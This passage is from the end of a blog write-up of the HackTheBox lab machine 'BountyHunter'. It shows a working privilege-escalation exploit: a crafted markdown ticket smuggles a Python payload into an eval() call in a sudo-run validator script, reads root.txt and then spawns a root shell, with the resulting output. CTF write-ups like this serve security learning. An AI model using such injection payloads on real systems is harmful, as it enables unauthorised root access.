</span></span><span class=line><span class=cl>    <span class=n>fileName</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Please enter the path to the ticket file.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ticket</span> <span class=o>=</span> <span class=n>load_file</span><span class=p>(</span><span class=n>fileName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>evaluate</span><span class=p>(</span><span class=n>ticket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Valid ticket.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Invalid ticket.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ticket</span><span class=o>.</span><span class=n>close</span>
</span></span></code></pre></div><h4 id=exploitation>Exploitation<a class=anchor aria-hidden=true href=#exploitation>#</a></h4><p>To exploit this script, I can just create a md file, and the first three line are:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl><span class=gh># Skytrain Inc
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gu>## Ticket to me
</span></span></span><span class=line><span class=cl><span class=gu></span>__Ticket Code:__
</span></span></code></pre></div><p>Now in the fourth line, I can inject a Python code such as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>**</span><span class=mi>32</span><span class=o>+</span><span class=mi>0</span><span class=o>==</span><span class=mi>32</span> <span class=ow>and</span> <span class=nb>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;cat /root/root.txt&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>As long as the number has 4 as the remainder when mod by 7, it can pass these lines and it will be <em>eval</em>-ed and executed as <code>32+0==32 and __import__('os').system('cat /root/root.txt')</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=n>code_line</span> <span class=ow>and</span> <span class=n>i</span> <span class=o>==</span> <span class=n>code_line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>x</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;**&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=c1># [&#34;32&#34;, &#34;0==32 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;)&#34;]</span>
</span></span><span class=line><span class=cl>    <span class=n>ticketCode</span> <span class=o>=</span> <span class=n>x</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;**&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;+&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=c1># 32</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>ticketCode</span><span class=p>)</span> <span class=o>%</span> <span class=mi>7</span> <span class=o>==</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>validationNumber</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;**&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span></code></pre></div><blockquote><p><code>os.system([command])</code> returns value of 0 if the execution is success.</p></blockquote><p>The complete file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>development@bountyhunter:/dev/shm$ cat iamf.md
</span></span><span class=line><span class=cl><span class=c1># Skytrain Inc</span>
</span></span><span class=line><span class=cl><span class=c1>## Ticket to me</span>
</span></span><span class=line><span class=cl>__Ticket Code:__
</span></span><span class=line><span class=cl>**32+0<span class=o>==</span><span class=m>32</span> and __import__<span class=o>(</span><span class=s1>&#39;os&#39;</span><span class=o>)</span>.system<span class=o>(</span><span class=s1>&#39;cat /root/root.txt&#39;</span><span class=o>)</span>
</span></span></code></pre></div><p>Now I can run and supply my ticket file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
</span></span><span class=line><span class=cl>Please enter the path to the ticket file.
</span></span><span class=line><span class=cl>iamf.md
</span></span><span class=line><span class=cl>Destination: me
</span></span><span class=line><span class=cl>70cfb26382b7af00c95360e142894b1f
</span></span><span class=line><span class=cl>Invalid ticket.
</span></span></code></pre></div><p>For shell, I can just change the fourth line to execute bash.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>**32+0==32 and <span class=gs>__import__</span>(&#39;os&#39;).system(&#39;/bin/bash&#39;)
</span></span></code></pre></div><p>And done.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
</span></span><span class=line><span class=cl>Please enter the path to the ticket file.
</span></span><span class=line><span class=cl>iamf.md
</span></span><span class=line><span class=cl>Destination: me
</span></span><span class=line><span class=cl>root@bountyhunter:/dev/shm# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span><span class=line><span class=cl>root@bountyhunter:/dev/shm# ls -l /root/
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>-r-------- <span class=m>1</span> root root   <span class=m>33</span> Jul <span class=m>30</span> 16:38 root.txt
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root root <span class=m>4096</span> Apr  <span class=m>5</span> 22:48 snap
</span></span><span class=line><span class=cl>root@bountyhunter:/dev/shm#
</span></span></code></pre></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/arbitrary-file-read/>Arbitrary-file-read</a></li><li><a href=https://fahmifj.github.io/tags/xxe/>XXE</a></li><li><a href=https://fahmifj.github.io/tags/code-injection/>Code-Injection</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - BountyHunter on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20BountyHunter&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbountyhunter%2f&hashtags=Linux%2cArbitrary-file-read%2cXXE%2cCode-Injection"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - BountyHunter on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbountyhunter%2f&title=HackTheBox%20-%20BountyHunter&summary=HackTheBox%20-%20BountyHunter&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbountyhunter%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - BountyHunter on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbountyhunter%2f&title=HackTheBox%20-%20BountyHunter"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - BountyHunter on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbountyhunter%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - BountyHunter on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20BountyHunter%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbountyhunter%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - BountyHunter on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20BountyHunter&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbountyhunter%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>